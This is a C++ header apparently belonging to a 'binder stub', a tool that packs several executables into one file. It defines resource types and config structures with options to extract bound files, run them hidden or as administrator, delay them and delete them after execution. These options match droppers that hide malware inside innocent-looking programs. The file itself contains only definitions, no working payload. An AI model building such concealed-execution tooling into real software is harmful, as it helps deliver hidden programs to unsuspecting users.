// TorGames.Binder.Stub - Common definitions
#pragma once

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <shellapi.h>
#include <shlobj.h>
#include <shlwapi.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <vector>

// Custom resource types for binder
#define RT_BINDER_CONFIG    256
#define RT_BINDER_FILE      257

// Configuration structure for bound files
struct BoundFileConfig {
    std::string filename;
    int executionOrder;
    bool executeFile;
    bool waitForExit;
    bool runHidden;
    bool runAsAdmin;
    std::string extractPath;
    std::string commandLineArgs;
    int executionDelay;
    bool deleteAfterExecution;
};

struct BinderConfig {
    int configVersion;
    bool requireAdmin;
    std::vector<BoundFileConfig> files;
};
